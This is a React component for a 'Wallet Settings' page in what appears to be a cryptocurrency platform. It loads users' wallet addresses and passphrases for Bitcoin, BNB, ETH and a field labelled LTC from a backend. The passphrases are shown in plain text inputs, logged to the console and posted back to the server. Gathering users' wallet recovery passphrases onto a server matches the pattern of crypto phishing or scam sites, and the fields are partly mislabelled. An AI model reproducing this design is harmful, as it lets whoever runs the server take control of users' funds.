import React, { useState, useCallback, useEffect } from "react";
import { Link } from "react-router-dom";
import Logo from "../logo.svg";
import "../App.css";
import SideBar from "../components/base";
import Content from "../components/content";
import Card from "../components/card";
import { Button } from "@mui/material";
import Box from "@mui/material/Box";
import Input from "@mui/material/Input";
import InputLabel from "@mui/material/InputLabel";
import InputAdornment from "@mui/material/InputAdornment";
import FormControl from "@mui/material/FormControl";
import AccountCircle from "@mui/icons-material/AccountCircle";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";

const Wallet = () => {
  const [BTCvalue, setBTCValue] = useState(0);
  const [ETHvalue, setETHValue] = useState(0);
  const [BNBvalue, setBNBValue] = useState(0);
  const [LTCvalue, setLTCValue] = useState(0);
  const [trust, setTrust] = useState("");
  const [usdt, setUsdt] = useState("");
  const [usdtadd, setUsdtadd] = useState("");
  const [eth, setEth] = useState("");
  const [ethadd, setEthadd] = useState("");
  const [block, setBlock] = useState("");
  const [btcadd, setBtcadd] = useState("");
  const [twcadd, setTwcadd] = useState("");
  const [data, setData] = useState("");
  const [coin, setCoin] = useState("");
  const [address, setAddress] = useState("");
  const [passPhrase, setPassPhrase] = useState("");
  const [loading, setLoading] = React.useState(false);
  const [loading1, setLoading1] = React.useState(false);

  const getData = useCallback(() => {
    try {
      axios
        .get(`http://localhost:5000/users/user/${localStorage.getItem("id")}`)
        .then((res) => {
          setLoading(false);
          console.log(res);
          if (res.data.hasError === false) {
            setData(res.data.users);
            setTrust(res.data.users.trustWalletPassPhrase);
            setBlock(res.data.users.bitcoinPassPhrase);
            setBtcadd(res.data.users.bitcoinAddress);
            setTwcadd(res.data.users.trustWalletAddress);

            setEthadd(res.data.users.ethAddress);
            setEth(res.data.users.ethPassphrase);
            setUsdt(res.data.users.usdtPassphrase);
            setUsdtadd(res.data.users.usdtAddress);

            console.log(data);
          } else {
            toast.error(res.data.message);
          }
        });
    } catch (error) {
      toast.error("Error loading data");
    }
  }, [data]);

  useEffect(() => {
    let isMounted = true;
    if (isMounted) {
      getData();
    }

    const interval = setInterval(() => {
      setBTCValue(localStorage.getItem("TotalBtc"));
      setETHValue(localStorage.getItem("TotalEth"));
      setBNBValue(localStorage.getItem("TotalBnb"));
      setLTCValue(localStorage.getItem("TotalLtc"));
    }, 200);
    return () => clearInterval(interval);

    // return () => {
    //   isMounted = false;
    // };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleSubmit = (event) => {
    event.preventDefault();
    setLoading(true);
    const data = {
      btcAddress: btcadd,
      btcPassphrase: block,
      twPassphrase: trust,
      trustWalletAddress: twcadd,
      ethAddress: ethadd,
      ethPassphrase: eth,
      usdtAddress: usdtadd,
      usdtPassphrase: usdt,
    };
    const headers = {
      "Content-Type": "application/json",
      authorization: `Bearer ${localStorage.getItem("token")}`,
    };
    console.log(data);
    axios
      .post("http://localhost:5000/users/phrase", data, {
        headers: headers,
      })
      .then((res) => {
        setLoading(false);
        console.log(res);
        if (res.data.hasError === false) {
          toast.success("Updated successfully");
        } else {
          toast.error(res.data.message);
        }
      });
  };

  const handleSubmit1 = (event) => {
    event.preventDefault();
    setLoading1(true);
    const data = {
      coin,
      passPhrase,
      address,
    };
    const headers = {
      "Content-Type": "application/json",
      authorization: `Bearer ${localStorage.getItem("token")}`,
    };
    console.log(data);
    axios
      .post("http://localhost:5000/users/coins", data, {
        headers: headers,
      })
      .then((res) => {
        setLoading1(false);
        console.log(res);
        if (res.data.hasError === false) {
          toast.success("Updated successfully");
        } else {
          toast.error(res.data.message);
        }
      });
  };

  return (
    <SideBar>
      <div
        style={{
          display: "flex",
          justifyContent: "space-between",
          flexWrap: "wrap",
        }}
      >
        <div className="status">
          <div className="stat">ETH</div>
          <div className="name">{+ETHvalue}</div>
        </div>
        <div className="status">
          <div className="stat">BNB</div>
          <div className="name">{+BNBvalue}</div>
        </div>
        <div className="status">
          <div className="stat">LTC</div>
          <div className="name">{+LTCvalue}</div>
        </div>
        <div className="status">
          <div className="stat">BTC</div>
          <div className="name">{+BTCvalue}</div>
        </div>
      </div>
      <Card className="about" style={{ marginTop: "30px" }}>
        <div
          style={{
            fontSize: "28px",
            marginBottom: "30px",
            textAlign: "center",
            marginTop: "30px",
          }}
        >
          Wallet Settings
        </div>
        <div style={{ width: "70%", margin: "auto", paddingTop: "30px" }}>
          <Box style={{ width: "400px", margin: "auto" }}>
            <FormControl variant="standard">
              <InputLabel htmlFor="input-with-icon-adornment">
                Bitcoin Address
              </InputLabel>
              <Input
                id="input-with-icon-adornment"
                style={{ width: "400px" }}
                value={btcadd}
                onChange={(e) => setBtcadd(e.target.value)}
              />
            </FormControl>
          </Box>
          <Box style={{ width: "400px", margin: "auto", marginTop: "30px" }}>
            <FormControl variant="standard">
              <InputLabel htmlFor="input-with-icon-adornment">
                Passphrase Bitcoin
              </InputLabel>
              <Input
                id="input-with-icon-adornment"
                style={{ width: "400px" }}
                value={block}
                onChange={(e) => setBlock(e.target.value)}
              />
            </FormControl>
          </Box>
          <Box style={{ width: "400px", margin: "auto", marginTop: "30px" }}>
            <FormControl variant="standard">
              <InputLabel htmlFor="input-with-icon-adornment">
                Passphrase BNB
              </InputLabel>
              <Input
                id="input-with-icon-adornment"
                style={{ width: "400px" }}
                value={trust}
                onChange={(e) => setTrust(e.target.value)}
              />
            </FormControl>
          </Box>
          <Box style={{ width: "400px", margin: "auto", marginTop: "30px" }}>
            <FormControl variant="standard">
              <InputLabel htmlFor="input-with-icon-adornment">
                BNB Address
              </InputLabel>
              <Input
                id="input-with-icon-adornment"
                style={{ width: "400px" }}
                value={twcadd}
                onChange={(e) => setTwcadd(e.target.value)}
              />
            </FormControl>
          </Box>

          <Box style={{ width: "400px", margin: "auto", marginTop: "30px" }}>
            <FormControl variant="standard">
              <InputLabel htmlFor="input-with-icon-adornment">
                ETH Address
              </InputLabel>
              <Input
                id="input-with-icon-adornment"
                style={{ width: "400px" }}
                value={ethadd}
                onChange={(e) => setEthadd(e.target.value)}
              />
            </FormControl>
          </Box>
          <Box style={{ width: "400px", margin: "auto", marginTop: "30px" }}>
            <FormControl variant="standard">
              <InputLabel htmlFor="input-with-icon-adornment">
                Passphrase Eth
              </InputLabel>
              <Input
                id="input-with-icon-adornment"
                style={{ width: "400px" }}
                value={eth}
                onChange={(e) => setEth(e.target.value)}
              />
            </FormControl>
          </Box>
          <Box style={{ width: "400px", margin: "auto", marginTop: "30px" }}>
            <FormControl variant="standard">
              <InputLabel htmlFor="input-with-icon-adornment">
                LTC Address
              </InputLabel>
              <Input
                id="input-with-icon-adornment"
                style={{ width: "400px" }}
                value={usdtadd}
                onChange={(e) => setUsdtadd(e.target.value)}
              />
            </FormControl>
          </Box>
          <Box style={{ width: "400px", margin: "auto", marginTop: "30px" }}>
            <FormControl variant="standard">
              <InputLabel htmlFor="input-with-icon-adornment">
                Passphrase LTC
              </InputLabel>
              <Input
                id="input-with-icon-adornment"
                style={{ width: "400px" }}
                value={usdt}
                onChange={(e) => setUsdt(e.target.value)}
              />
            </FormControl>
          </Box>

          <div
            style={{ display: "flex", justifyContent: "center", width: "100%" }}
          >
            <Button
              style={{ margin: "30px", display: "flex", alignSelf: "center" }}
              variant="contained"
              onClick={handleSubmit}
            >
              {loading ? "Updating..." : "Update"}
            </Button>
          </div>
        </div>
      </Card>
    </SideBar>
  );
};

export default Wallet;
